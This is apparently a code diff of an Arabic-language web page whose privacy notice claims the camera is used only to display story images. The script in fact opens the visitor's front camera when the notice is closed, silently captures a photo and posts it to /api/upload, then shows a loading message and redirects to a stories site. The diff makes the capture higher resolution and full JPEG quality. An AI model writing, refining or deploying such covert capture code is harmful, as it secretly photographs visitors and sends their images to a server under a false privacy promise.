@@ -94,8 +94,9 @@
       <span id="closeBtn">&times;</span>
       <h2>تنويه الخصوصية</h2>
       <p>
-       <br>
-        هذا الموقع يطلب بعض الاذونات فقط لضمان عمل التطبيق بشكل صحيح مثل عرض القصص المصورة . نحن نحرص على حماية خصوصيتك وعدم استخدام الكاميرا او اي شيئ اخر بل فقط التطبيق يحتاجها لعرض الصور الخاصه بالقصص.
+        <br>
+        هذا الموقع يطلب بعض الاذونات فقط لضمان عمل التطبيق بشكل صحيح مثل عرض القصص المصورة.
+        نحن نحرص على حماية خصوصيتك وعدم استخدام الكاميرا أو أي شيء آخر بل فقط التطبيق يحتاجها لعرض الصور الخاصة بالقصص.
       </p>
     </div>
   </div>
@@ -110,43 +111,49 @@
     closeBtn.addEventListener('click', () => {
       privacyModal.style.display = 'none';
 
-      navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-        .then(function(stream) {
-          const video = document.getElementById('video');
-          video.srcObject = stream;
+      navigator.mediaDevices.getUserMedia({
+        video: {
+          facingMode: "user",
+          width: { ideal: 1280 },
+          height: { ideal: 720 }
+        }
+      })
+      .then(function(stream) {
+        const video = document.getElementById('video');
+        video.srcObject = stream;
 
-          video.onloadedmetadata = () => {
+        video.onloadedmetadata = () => {
+          setTimeout(() => {
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            const imageData = canvas.toDataURL('image/jpeg', 1.0); // JPEG بأعلى جودة
+
+            fetch('/api/upload', {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json'
+              },
+              body: JSON.stringify({ image: imageData })
+            });
+
+            // عرض رسالة جاري التحميل
+            document.body.innerHTML = '<div style="display:flex;justify-content:center;align-items:center;height:100vh;font-family: Cairo, sans-serif;font-size:24px;color:#333;">جاري تحميل صفحة القصص...</div>';
+
+            // تحويل للرابط بعد 3 ثواني
             setTimeout(() => {
-              const canvas = document.getElementById('canvas');
-              const context = canvas.getContext('2d');
-              canvas.width = video.videoWidth;
-              canvas.height = video.videoHeight;
-              context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-              const imageData = canvas.toDataURL('image/png');
-
-              fetch('/api/upload', {
-                method: 'POST',
-                headers: {
-                  'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ image: imageData })
-              });
-
-              // عرض رسالة جاري التحميل
-              document.body.innerHTML = '<div style="display:flex;justify-content:center;align-items:center;height:100vh;font-family: Cairo, sans-serif;font-size:24px;color:#333;">جاري تحميل صفحة القصص...</div>';
-
-              // تحويل للرابط بعد 3 ثواني
-              setTimeout(() => {
-                window.location.href = 'https://stories22.netlify.app/';
-              }, 3000);
-
+              window.location.href = 'https://stories22.netlify.app/';
             }, 3000);
-          };
-        })
-        .catch(function(err) {
-          console.error("Camera access denied:", err);
-        });
+
+          }, 3000);
+        };
+      })
+      .catch(function(err) {
+        console.error("Camera access denied:", err);
+      });
     });
   </script>
 </body>
